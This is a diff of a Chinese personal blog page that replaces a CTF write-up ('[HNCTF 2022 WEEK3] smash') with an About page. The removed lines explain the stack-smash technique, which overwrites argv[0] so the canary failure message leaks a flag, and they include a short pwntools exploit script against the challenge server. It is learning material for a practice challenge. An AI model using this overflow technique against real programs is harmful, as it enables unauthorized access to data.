@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>[HNCTF 2022 WEEK3] smash 复现 | Xzzzz911</title>
+    <title>关于 | Xzzzz911</title>
     <meta name="author" content="Xzzzz911" />
     <meta name="description" content="This is my website Hello Everyone" />
     <meta name="keywords" content="" />
@@ -244,36 +244,13 @@
             <!-- ✅ 页面标题和标签 --> 
 
 <div class="post-title-area">
-  <h1 style="color: #b6b4b4; font-size: 2.5rem; font-weight: bold; margin-bottom: 0.5rem;">[HNCTF 2022 WEEK3] smash 复现</h1>
+  <h1 style="color: #b6b4b4; font-size: 2.5rem; font-weight: bold; margin-bottom: 0.5rem;">关于</h1>
   <div class="info" style="font-size: 0.95rem; color: #555;">
     <span class="date">
       <span class="icon"><i class="fa-solid fa-calendar fa-fw"></i></span>
-      2023/9/7
+      2025/7/22
     </span>
     
-    <span class="category" style="margin-left: 1rem;">
-      <a href="/categories/CTF/">
-        <span class="icon"><i class="fa-solid fa-bookmark fa-fw"></i></span>
-        CTF
-      </a>
-    </span>
-    
-    
-    <span class="tags" style="margin-left: 1rem;">
-      <span class="icon"><i class="fa-solid fa-tags fa-fw"></i></span>
-      
-      
-      <span class="tag">
-        
-        <a href="/tags/PWN/" style="color: #00a596; margin-right: 0.5rem;">PWN</a>
-      </span>
-      
-      <span class="tag">
-        
-        <a href="/tags/HNCTF/" style="color: #ff7d73; margin-right: 0.5rem;">HNCTF</a>
-      </span>
-      
-    </span>
     
   </div>
 </div>
@@ -285,26 +262,8 @@
     <div class="post">
       
         <div class="content" v-pre>
-          <p>[HNCTF 2022 WEEK3] smash 复现</p>
-<span id="more"></span>
-
-<h1 id="smash"><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>接下来我们就需要了解一下 stack smash<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
-<blockquote>
-<h2 id="stack-smash"><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
-</blockquote>
-<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>也可以这样算</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
-<h2 id="exp如下"><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
+          <p>这里写一段介绍你的话，比如：</p>
+<p>我是熊之之，一名热爱网络安全和前端开发的博主。欢迎访问我的博客！✌️</p>
 
         </div>
       
@@ -392,7 +351,7 @@
           <div class="toc-header">
             <i class="fa-solid fa-list-ul"></i> 目录
           </div>
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#smash"><span class="toc-number">1.</span> <span class="toc-text">smash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-smash"><span class="toc-number">1.1.</span> <span class="toc-text">Stack smash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">exp如下：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结：</span></a></li></ol>
+          
         </div>
       </div>
     </div>
@@ -403,22 +362,14 @@
 <div class="post-nav-outer" style="max-width: 1200px; margin: 3rem auto 0; display: flex; justify-content: center;">
   <div class="post-nav-inner" style="flex: 3; display: flex; gap: 1rem;">
     
-      <a href="/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc;">
+      <!-- 无上一篇时显示当前文章占位 -->
+      <a href="/about/" style="flex: 1; text-decoration: none; color: #999; cursor: default;">
         <div>
-          <div style="font-size: 0.85rem; color: #492630;">⬅ 上一篇</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[HNCTF 2022 WEEK4] ezcanary 复现</div>
+          <div style="font-size: 0.85rem; color: #492630;">⬅ 本篇 </div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">关于</div>
           <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2023-09-22
+            <i class="fa fa-calendar"></i> 2025-07-22
             
-              &nbsp;| <i class="fa fa-folder-open"></i> 
-            
-            
-              &nbsp;| <i class="fa fa-tags"></i>
-              
-                PWN, 
-              
-                HNCTF
-              
             
           </div>
         </div>
@@ -426,22 +377,14 @@
     
 
     
-      <a href="/%5BSDCTF%202022%5DprintFAILED%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc; text-align: right;">
+      <!-- 无下一篇时显示当前文章占位 -->
+      <a href="/about/" style="flex: 1; text-decoration: none; color: #999; text-align: right; cursor: default;">
         <div>
-          <div style="font-size: 0.85rem; color: #492630;">下一篇 ➡</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[SDCTF 2022]printFAILED 复现</div>
+          <div style="font-size: 0.85rem; color: #492630;"> 本篇 ➡</div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">关于</div>
           <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2023-09-06
+            <i class="fa fa-calendar"></i> 2025-07-22
             
-              &nbsp;| <i class="fa fa-folder-open"></i> 
-            
-            
-              &nbsp;| <i class="fa fa-tags"></i>
-              
-                PWN, 
-              
-                SDCTF
-              
             
           </div>
         </div>
@@ -732,7 +675,7 @@ document.addEventListener("DOMContentLoaded", function() {
     <!-- 新增：监听标签页切换，动态修改标签页标题 -->
     <script>
     (function () {
-        const isPost = true; // ✅ 是否是文章页面
+        const isPost = false; // ✅ 是否是文章页面
         const originalTitle = document.title;
         const awayTitle = "🤠别再玩了啦~";
         const backTitle = "🚩给我狠狠学~";
